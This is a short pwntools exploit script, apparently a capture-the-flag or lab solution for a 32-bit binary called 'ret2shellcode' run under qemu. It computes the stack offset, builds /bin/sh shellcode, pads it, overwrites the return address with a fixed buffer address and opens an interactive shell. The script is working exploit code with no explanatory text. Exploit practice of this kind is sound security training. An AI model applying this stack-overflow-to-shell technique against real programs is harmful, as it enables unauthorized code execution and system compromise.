from pwn import*
context(os='linux', arch='i386', log_level='debug')
sh=process(["qemu-i386","-L","/usr/i686-linux-gnu/","./ret2shellcode"])
buf=0xffffdefc
esp=0xffffdf6c
offset=esp-buf
target=0x804a080
shellcode=asm(shellcraft.sh())
shell_A=(offset-len(shellcode))*b'A'
payload=flat(shellcode,shell_A,target)
sh.sendline(payload)
sh.interactive()